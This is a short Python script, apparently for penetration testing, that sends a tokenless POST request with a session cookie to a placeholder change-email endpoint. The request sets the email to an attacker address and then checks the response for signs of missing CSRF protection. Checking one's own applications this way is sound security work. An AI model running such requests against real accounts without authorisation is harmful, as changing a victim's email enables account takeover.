import requests

# Target endpoint that performs a state-changing action (e.g., change password, update email)
target_url = "http://example.com/change-email"  # Replace with actual target
cookies = {'sessionid': 'your-session-id'}  # Replace with valid session cookie if needed

# Simulated CSRF request without token
data = {
    'email': 'attacker@example.com'  # Payload you want to test
}

print("[+] Sending simulated CSRF request...")

response = requests.post(target_url, data=data, cookies=cookies)

# Check response for signs of success or protection
if "email updated" in response.text.lower():
    print("[!] Potential CSRF vulnerability detected!")
else:
    print("[-] CSRF protection might be in place or action blocked.")